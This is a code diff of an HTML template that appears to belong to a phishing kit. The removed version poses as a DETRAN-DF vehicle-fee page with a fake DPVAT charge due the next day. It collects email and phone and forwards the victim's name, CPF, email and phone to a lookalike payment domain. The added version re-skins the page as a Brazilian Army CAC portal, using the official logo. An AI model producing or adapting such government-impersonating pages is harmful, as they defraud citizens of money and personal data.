@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal DPVAT - Dados do Usuário</title>
+    <title>Portal CAC - Dados do Usuário</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -20,20 +20,13 @@
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .animate-spin {
-            animation: spin 1s linear infinite;
-        }
     </style>
     <script>
         tailwind.config = {
             theme: {
                 extend: {
                     colors: {
-                        'custom-blue': '#225BAC',
-                        'custom-yellow': '#F7CD04',
+                        'custom-green': '#115E2F',
                     }
                 }
             }
@@ -45,190 +38,78 @@
     <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <img src="https://www.eb.mil.br/image/layout_set_logo?img_id=2784964&t=1674070423784" alt="Logo do Exército Brasileiro" class="h-16 mb-2" />
                 <div>
-                    <p class="text-black text-[10px] leading-tight">
-                        SECRETARIA DE ESTADO DE ECONOMIA
+                    <p class="text-black text-sm leading-tight font-bold">
+                        EXÉRCITO BRASILEIRO
                     </p>
-                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
-                        DETRAN - Distrito Federal
+                    <p id="state-text" class="text-black text-sm leading-tight">
+                        Braço Forte - Mão Amiga
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Blue bar -->
-    <div class="bg-custom-blue py-3 shadow-md">
-        <div class="container mx-auto px-4 flex items-center">
-            <button class="text-white text-2xl mr-4">
-                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-1.5 h-1.5 bg-white"></div>
-                </div>
-            </button>
-            <span class="text-white text-xl drop-shadow-sm">CONFIRME SEUS DADOS</span>
+    <!-- Title Bar -->
+    <div class="bg-custom-green py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center justify-center">
+            <span class="text-white text-xl drop-shadow-sm">DADOS DO CANDIDATO</span>
         </div>
     </div>
 
     <!-- Main Content -->
     <div class="container mx-auto px-4 py-6">
         <div class="max-w-2xl mx-auto">
-            <!-- Personal Data -->
-            <div class="bg-white rounded-lg shadow-md p-4 mb-4">
-                <h2 class="text-lg font-bold text-gray-800 mb-3">Dados do Contribuinte</h2>
-                <div class="space-y-3">
-                    <!-- Full width name field -->
+            <!-- Personal Information -->
+            <div class="bg-white rounded-lg shadow-md p-6 mb-4">
+                <h2 class="text-lg font-bold text-gray-800 mb-4">Informações do Candidato</h2>
+                <div class="space-y-4">
+                    <!-- Nome -->
                     <div class="border rounded-lg p-3">
                         <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
-                        <p class="mt-1 text-gray-900 font-bold truncate">{{ dados.NOME }}</p>
+                        <p class="mt-1 text-gray-900 font-bold">{{ dados.name }}</p>
                     </div>
-                    <!-- Two column layout for CPF and Birth Date -->
-                    <div class="grid grid-cols-2 gap-3">
+                    <!-- CPF -->
+                    <div class="border rounded-lg p-3">
+                        <label class="block text-sm font-medium text-gray-600">CPF</label>
+                        <p class="mt-1 text-gray-900 font-bold">{{ dados.cpf }}</p>
+                    </div>
+                </div>
+
+                <div class="mt-6">
+                    <h3 class="text-md font-bold text-gray-800 mb-3">Dados de Contato</h3>
+                    <div class="space-y-4">
+                        <!-- Email -->
                         <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">CPF</label>
-                            <p class="mt-1 text-gray-900 font-bold">{{ dados.CPF }}</p>
+                            <label class="block text-sm font-medium text-gray-600">E-mail</label>
+                            <p class="mt-1 text-gray-900">{{ dados.email }}</p>
                         </div>
+                        <!-- Telefone -->
                         <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">Data de Nascimento</label>
-                            <p class="mt-1 text-gray-900 font-bold">{{ dados.NASC[:10] }}</p>
+                            <label class="block text-sm font-medium text-gray-600">Telefone</label>
+                            <p class="mt-1 text-gray-900">{{ dados.phone }}</p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Vehicle Data -->
-            <div class="bg-white rounded-lg shadow-md p-4 mb-4">
-                <h2 class="text-lg font-bold text-gray-800 mb-3">Dados do Veículo</h2>
-                <div class="grid grid-cols-2 gap-3">
-                    <div class="border rounded-lg p-3">
-                        <label class="block text-sm font-medium text-gray-600">Placa</label>
-                        <p class="mt-1 text-gray-900 font-bold">{{ veiculo.plate }}</p>
-                    </div>
-
-                    <div class="border rounded-lg p-3">
-                        <label class="block text-sm font-medium text-gray-600">Chassi</label>
-                        <p class="mt-1 text-gray-900 font-bold">{{ veiculo.chassis }}</p>
-                    </div>
-
-                    <div class="border rounded-lg p-3">
-                        <label class="block text-sm font-medium text-gray-600">Modelo</label>
-                        <p class="mt-1 text-gray-900 font-bold">{{ veiculo.marca }} {{ veiculo.modelo }}</p>
-                    </div>
-
-                    <div class="border rounded-lg p-3">
-                        <label class="block text-sm font-medium text-gray-600">Valor DPVAT</label>
-                        <p class="mt-1 text-gray-900 font-bold text-custom-blue">R$ 82,60</p>
-                    </div>
+            <!-- Action Buttons -->
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="text-center text-sm text-gray-600 mb-4">
+                    <p>Verifique se seus dados estão corretos antes de prosseguir.</p>
+                    <p>Em caso de divergências, entre em contato com a Seção de Fiscalização de Produtos Controlados (SFPC) da sua região.</p>
                 </div>
-
-                <div class="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
-                    <div class="flex items-center">
-                        <i class="fas fa-clock text-yellow-600 mr-2"></i>
-                        <span class="text-sm text-yellow-800 font-bold">
-                            Vencimento em {{ (now() + timedelta(days=1)).strftime('%d/%m/%Y') }}
-                        </span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bg-white rounded-lg shadow-md p-4">
-                <button id="submitBtn" class="bg-custom-blue text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors flex items-center justify-center">
-                    <span>Confirmar e Prosseguir</span>
-                    <i class="fas fa-arrow-right ml-2"></i>
+                <button onclick="window.location.href = '/'" class="bg-custom-green text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors">
+                    Voltar ao Início
                 </button>
             </div>
         </div>
     </div>
 
-    <!-- Modal -->
-    <div id="updateModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 hidden overflow-y-auto h-full w-full">
-        <div class="relative top-20 mx-auto p-5 border w-96 shadow-lg rounded-md bg-white">
-            <div class="mt-3">
-                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-yellow-100">
-                    <i class="fas fa-exclamation-triangle text-yellow-600"></i>
-                </div>
-                <h3 class="text-lg leading-6 font-medium text-gray-900 text-center mt-4">Atualização de Cadastro</h3>
-                <div class="mt-2 px-7 py-3">
-                    <p class="text-sm text-gray-500 mb-4">
-                        Para prosseguir, atualize seus dados cadastrais no DETRAN:
-                    </p>
-                    <div class="mb-4">
-                        <label class="block text-gray-700 text-sm font-bold mb-2" for="email">
-                            Email
-                        </label>
-                        <input type="email" id="email" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
-                    </div>
-                    <div class="mb-4">
-                        <label class="block text-gray-700 text-sm font-bold mb-2" for="phone">
-                            Telefone com DDD
-                        </label>
-                        <input type="tel" id="phone" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" maxlength="15" required>
-                    </div>
-                </div>
-                <div class="items-center px-4 py-3">
-                    <button id="continueBtn" disabled class="bg-custom-blue text-white font-bold py-2 px-4 rounded w-full opacity-50 cursor-not-allowed">
-                        Continuar
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <!-- Footer -->
-    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
-        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+    <div class="bg-custom-green text-white text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro. Todos os direitos reservados.</p>
     </div>
-
-    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
-    <script>
-        document.getElementById('submitBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('updateModal').classList.remove('hidden');
-        });
-
-        // Phone mask
-        document.getElementById('phone').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length <= 11) {
-                value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
-                if (value.length < 14) value = value.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3');
-                if (value.length < 3) value = value.replace(/^(\d{0,2})/, '($1');
-                e.target.value = value;
-            }
-        });
-
-        // Form validation
-        const emailInput = document.getElementById('email');
-        const phoneInput = document.getElementById('phone');
-        const continueBtn = document.getElementById('continueBtn');
-
-        function validateForm() {
-            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
-            const phoneValid = phoneInput.value.replace(/\D/g, '').length >= 10;
-
-            continueBtn.disabled = !(emailValid && phoneValid);
-            continueBtn.classList.toggle('opacity-50', !emailValid || !phoneValid);
-            continueBtn.classList.toggle('cursor-not-allowed', !emailValid || !phoneValid);
-            continueBtn.classList.toggle('hover:bg-opacity-90', emailValid && phoneValid);
-        }
-
-        emailInput.addEventListener('input', validateForm);
-        phoneInput.addEventListener('input', validateForm);
-
-        continueBtn.addEventListener('click', function() {
-            const userData = {
-                nome: '{{ dados.NOME }}',
-                cpf: '{{ dados.CPF }}',
-                email: emailInput.value,
-                phone: phoneInput.value
-            };
-
-            const url = `https://pay.seguroobrigatorio.org/JqoR32lqemAGVj5?name=${encodeURIComponent(userData.nome)}&email=${encodeURIComponent(userData.email)}&telephone=${encodeURIComponent(userData.phone)}&document=${encodeURIComponent(userData.cpf)}`;
-            window.location.href = url;
-        });
-    </script>
 </body>
 </html>
